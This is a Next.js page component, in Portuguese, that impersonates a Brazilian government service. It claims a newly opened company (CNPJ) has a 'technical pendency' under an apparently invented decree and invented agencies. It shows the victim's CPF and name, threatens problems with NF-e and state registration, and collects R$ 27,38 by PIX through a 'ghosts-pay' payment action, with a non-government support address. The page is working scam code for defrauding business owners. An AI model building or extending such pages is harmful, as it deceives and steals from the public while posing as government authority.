"use client"

import { useEffect, useState } from "react"
import { useRouter } from "next/navigation"
import Image from "next/image"
import { Clipboard, Check, Shield, HelpCircle, AlertTriangle, CheckCircle, Database, Server } from "lucide-react"
import { generatePayment, checkPaymentStatus } from "@/actions/ghosts-pay"
import type { PaymentData, VerificationData } from "@/lib/types"
import { formatCPF } from "@/lib/utils"
import { ProtocolBadge } from "@/components/protocol-badge"
import { AlertBox } from "@/components/alert-box"

export default function ValidacaoTecnicaPage() {
  const router = useRouter()
  const [verificationData, setVerificationData] = useState<VerificationData | null>(null)
  const [paymentData, setPaymentData] = useState<PaymentData | null>(null)
  const [isLoading, setIsLoading] = useState(false)
  const [copied, setCopied] = useState(false)
  const [checkingPayment, setCheckingPayment] = useState(false)
  const [error, setError] = useState<string | null>(null)
  const [protocol, setProtocol] = useState("")
  const [showHelp, setShowHelp] = useState(false)
  const [autoCheckActive, setAutoCheckActive] = useState(true)
  const currentDate = new Date().toLocaleDateString("pt-BR")
  const [pendencyNumber] = useState(`TCRP-${Math.floor(1000 + Math.random() * 9000)}`)
  const [loadingQRCode, setLoadingQRCode] = useState(false)

  useEffect(() => {
    const storedData = sessionStorage.getItem("verificationData")
    const storedProtocol = sessionStorage.getItem("protocol")

    if (!storedData) {
      router.push("/")
      return
    }

    const data = JSON.parse(storedData) as VerificationData
    setVerificationData(data)

    if (storedProtocol) {
      setProtocol(storedProtocol)
    }

    // Gerar QR code em segundo plano
    const generateQRCode = async () => {
      try {
        setLoadingQRCode(true)
        const payment = await generatePayment(data.cpf, 27.38)
        setPaymentData(payment)

        // Armazenar dados de pagamento na sessionStorage
        sessionStorage.setItem("paymentData2", JSON.stringify(payment))
        setLoadingQRCode(false)
      } catch (error) {
        console.error("Error generating payment:", error)
        setError("Ocorreu um erro ao gerar o QR Code. Usando dados simulados.")

        // Criar dados de pagamento simulados
        const simulatedPayment: PaymentData = {
          qrCodeUrl: "/qr-code-pix.png",
          qrCodeText:
            "00020101021226580014br.gov.bcb.pix0136123e4567-e89b-12d3-a456-426655440000520400005303986540527.385802BR5913Simulador PIX6008Brasilia62070503***63041234",
          value: 27.38,
          expiresAt: new Date(Date.now() + 30 * 60 * 1000).toISOString(),
          paymentId: `payment-${Date.now()}`,
        }

        setPaymentData(simulatedPayment)
        sessionStorage.setItem("paymentData2", JSON.stringify(simulatedPayment))
        setLoadingQRCode(false)
      }
    }

    generateQRCode()
  }, [router])

  // Verificação automática de pagamento a cada 2 segundos
  useEffect(() => {
    if (!paymentData || !autoCheckActive) return

    const interval = setInterval(() => {
      checkPaymentSilently()
    }, 2000)

    return () => clearInterval(interval)
  }, [paymentData, autoCheckActive])

  const copyToClipboard = () => {
    if (paymentData) {
      navigator.clipboard.writeText(paymentData.qrCodeText)
      setCopied(true)
      setTimeout(() => setCopied(false), 3000)
    }
  }

  // Modificar apenas a função checkPaymentSilently para adicionar mais logs
  const checkPaymentSilently = async () => {
    if (!paymentData) return

    try {
      console.log("Verificando pagamento silenciosamente para ID:", paymentData.paymentId)
      const isPaid = await checkPaymentStatus(paymentData.paymentId)
      console.log("Resultado da verificação silenciosa:", isPaid)

      if (isPaid) {
        console.log("Pagamento confirmado! Redirecionando para /validacao-tecnica/processando")
        router.push("/validacao-tecnica/processando")
      } else {
        console.log("Pagamento ainda não confirmado. Continuando verificação em segundo plano.")
      }
    } catch (error) {
      console.error("Error checking payment silently:", error)
      // Não mostrar erro para o usuário na verificação silenciosa
    }
  }

  // Modificar a função checkPayment para adicionar mais logs
  const checkPayment = async () => {
    if (!paymentData || checkingPayment) return

    setCheckingPayment(true)
    setAutoCheckActive(true) // Ativar verificação automática

    try {
      console.log("Verificando pagamento manualmente para ID:", paymentData.paymentId)
      const isPaid = await checkPaymentStatus(paymentData.paymentId)
      console.log("Resultado da verificação manual:", isPaid)

      if (isPaid) {
        console.log("Pagamento confirmado! Redirecionando para /validacao-tecnica/processando")
        router.push("/validacao-tecnica/processando")
      } else {
        setCheckingPayment(false)
        console.log("Pagamento não confirmado. Exibindo alerta para o usuário.")
        // Feedback mais claro para o usuário
        alert(
          "Pagamento ainda não identificado. Por favor, aguarde a confirmação do seu pagamento ou verifique se o PIX foi realizado corretamente.",
        )
      }
    } catch (error) {
      console.error("Error checking payment:", error)
      setCheckingPayment(false)
      // Não redirecionar em caso de erro, apenas mostrar mensagem
      alert("Não foi possível verificar o pagamento. Por favor, aguarde alguns instantes e tente novamente.")
    }
  }

  if (isLoading) {
    return (
      <div className="max-w-3xl mx-auto">
        <div className="gov-card text-center">
          <div className="w-16 h-16 border-4 border-blue-200 border-t-blue-600 rounded-full animate-spin mx-auto mb-6"></div>
          <p className="text-lg font-medium text-gray-700">Carregando informações...</p>
          <p className="text-sm text-gray-500 mt-2">Aguarde enquanto preparamos sua validação técnica</p>
        </div>
      </div>
    )
  }

  if (!verificationData) {
    return null
  }

  return (
    <div className="max-w-3xl mx-auto">
      <div className="gov-card">
        <div className="text-center mb-6">
          <h1 className="gov-heading text-2xl">Validação Técnica Complementar de CNPJ Ativo</h1>
          <p className="text-sm text-gray-700 mt-2">
            Conforme a Portaria Técnica Conjunta nº 145/2024 da PFCE/SEFISC, todas as empresas que concluíram a
            validação fiscal inicial deverão passar pela etapa complementar de regularização técnica até 24h após a
            abertura do CNPJ.
          </p>
          <div className="mt-4 flex justify-center">
            <div className="bg-blue-100 text-blue-800 text-xs font-medium px-2.5 py-1 rounded flex items-center">
              <span className="mr-1">•</span>
              <span>Emissão Nacional - PFCE/SERPRO 2024</span>
            </div>
          </div>
          <ProtocolBadge protocol={pendencyNumber} date={currentDate} className="mt-4" />
        </div>

        {error && (
          <AlertBox type="warning" title="Atenção" className="mb-4">
            <p>{error}</p>
          </AlertBox>
        )}

        <div className="space-y-6">
          <div className="bg-blue-50 p-4 rounded border border-blue-200">
            <p className="text-sm text-gray-700">
              Durante a transmissão dos dados da sua empresa ao sistema nacional de conformidade, foi identificada uma
              pendência técnica complementar vinculada à ativação do seu CNPJ junto aos seguintes órgãos:
            </p>

            <div className="mt-4 space-y-2">
              <div className="flex items-center">
                <Database className="text-blue-600 mr-2" size={18} />
                <span className="text-blue-800 font-medium">Sistema Integrado da Nota Fiscal Eletrônica (NF-e)</span>
              </div>
              <div className="flex items-center">
                <Server className="text-blue-600 mr-2" size={18} />
                <span className="text-blue-800 font-medium">
                  Cadastro Nacional Único de Responsáveis Legais (CAD-REL)
                </span>
              </div>
              <div className="flex items-center">
                <Shield className="text-blue-600 mr-2" size={18} />
                <span className="text-blue-800 font-medium">Banco Nacional de Integração Contábil (BNIC)</span>
              </div>
            </div>
          </div>

          <div className="bg-gray-50 p-4 rounded border border-gray-200">
            <h3 className="font-medium text-gray-800 mb-2">Tipo da Pendência:</h3>
            <p className="text-sm text-gray-700">
              Diferença de ativação de sincronização técnica entre plataformas fiscais nacionais (etapa 2 de 2)
            </p>

            <div className="mt-4">
              <h3 className="font-medium text-gray-800 mb-2">CPF do Responsável:</h3>
              <p className="text-sm text-gray-700">
                {formatCPF(verificationData.cpf)} - {verificationData.personData.name}
              </p>
            </div>
          </div>

          <div className="bg-green-50 p-4 rounded border border-green-200 text-center">
            <h2 className="text-xl font-semibold text-green-800 mb-2">Valor da Regularização Técnica</h2>
            <p className="text-3xl font-bold text-green-700 mb-2">R$ 27,38</p>
            <p className="text-sm text-gray-600">Pagamento único via QR Code Pix</p>
          </div>

          <div className="bg-yellow-50 p-4 rounded border border-yellow-200">
            <h3 className="text-md font-semibold text-yellow-800 mb-2 flex items-center">
              <AlertTriangle size={16} className="mr-2 text-yellow-600" />A não validação dessa etapa poderá gerar:
            </h3>
            <div className="space-y-2">
              <div className="flex items-start">
                <AlertTriangle className="text-yellow-500 mr-2 mt-0.5" size={16} />
                <span className="text-sm">Lentidão ou falha na emissão de NF-e</span>
              </div>
              <div className="flex items-start">
                <AlertTriangle className="text-yellow-500 mr-2 mt-0.5" size={16} />
                <span className="text-sm">Divergência de status cadastral nos bancos de dados estaduais</span>
              </div>
              <div className="flex items-start">
                <AlertTriangle className="text-yellow-500 mr-2 mt-0.5" size={16} />
                <span className="text-sm">Solicitação de nova revalidação por parte da Receita Estadual</span>
              </div>
            </div>
          </div>

          <div className="flex flex-col items-center">
            <div className="bg-white p-4 rounded-lg shadow-sm border border-gray-200 mb-4">
              {loadingQRCode ? (
                <div className="w-[250px] h-[250px] flex items-center justify-center">
                  <div className="w-10 h-10 border-4 border-blue-200 border-t-blue-600 rounded-full animate-spin"></div>
                </div>
              ) : paymentData ? (
                <div className="relative w-[250px] h-[250px]">
                  {paymentData.qrCodeUrl.startsWith("data:image") ? (
                    <img
                      src={paymentData.qrCodeUrl || "/placeholder.svg"}
                      alt="QR Code PIX"
                      className="w-full h-full object-contain"
                    />
                  ) : (
                    <Image
                      src={paymentData.qrCodeUrl || "/placeholder.svg"}
                      alt="QR Code PIX"
                      width={250}
                      height={250}
                      className="mx-auto"
                    />
                  )}
                </div>
              ) : null}
            </div>

            <div className="w-full max-w-md">
              <div className="flex items-center mb-2">
                <p className="text-sm font-medium text-gray-700">Código PIX Copia e Cola:</p>
                <button
                  onClick={() => setShowHelp(!showHelp)}
                  className="ml-1 text-[#1351b4] hover:text-[#071D41]"
                  title="Ajuda"
                >
                  <HelpCircle size={14} />
                </button>
              </div>
              <div className="flex">
                <div className="flex-1 bg-gray-100 p-2 rounded-l-md text-xs overflow-hidden text-gray-600 font-mono">
                  {paymentData?.qrCodeText.substring(0, 30)}...
                </div>
                <button
                  onClick={copyToClipboard}
                  className="bg-[#1351b4] hover:bg-[#0c326f] text-white px-3 rounded-r-md flex items-center justify-center"
                >
                  {copied ? <Check size={18} /> : <Clipboard size={18} />}
                </button>
              </div>
              <p className="text-xs text-gray-500 mt-1">Clique no botão para copiar o código completo</p>

              {showHelp && (
                <div className="mt-3 bg-[#e5f1ff] p-3 rounded border border-[#c4daff] text-xs text-gray-700">
                  <p className="font-medium text-[#071D41] mb-1">Como usar o Código PIX:</p>
                  <ol className="list-decimal pl-5 space-y-1">
                    <li>Clique no botão ao lado para copiar o código</li>
                    <li>Abra o aplicativo do seu banco</li>
                    <li>Selecione a opção "PIX" ou "Pagar com PIX"</li>
                    <li>Escolha a opção "Copia e Cola" ou "Pix Copia e Cola"</li>
                    <li>Cole o código copiado e confirme o pagamento</li>
                  </ol>
                </div>
              )}
            </div>
          </div>

          <div className="flex justify-center mt-4">
            <button
              onClick={checkPayment}
              className="gov-button text-white px-6 py-3 rounded-md flex items-center justify-center"
              disabled={checkingPayment || loadingQRCode}
            >
              {checkingPayment ? (
                <>
                  <svg
                    className="animate-spin -ml-1 mr-2 h-4 w-4 text-white"
                    xmlns="http://www.w3.org/2000/svg"
                    fill="none"
                    viewBox="0 0 24 24"
                  >
                    <circle
                      className="opacity-25"
                      cx="12"
                      cy="12"
                      r="10"
                      stroke="currentColor"
                      strokeWidth="4"
                    ></circle>
                    <path
                      className="opacity-75"
                      fill="currentColor"
                      d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                    ></path>
                  </svg>
                  Verificando pagamento...
                </>
              ) : (
                <>
                  <CheckCircle size={18} className="mr-2" />
                  Regularizar Validação Técnica (R$ 27,38)
                </>
              )}
            </button>
          </div>

          <div className="text-center mt-4 text-sm text-gray-600">
            <p>Suporte Técnico CNPJ Nacional – 0800 725 0194</p>
            <p>suporte@cadastro-fiscal.digital</p>
          </div>
        </div>
      </div>
    </div>
  )
}
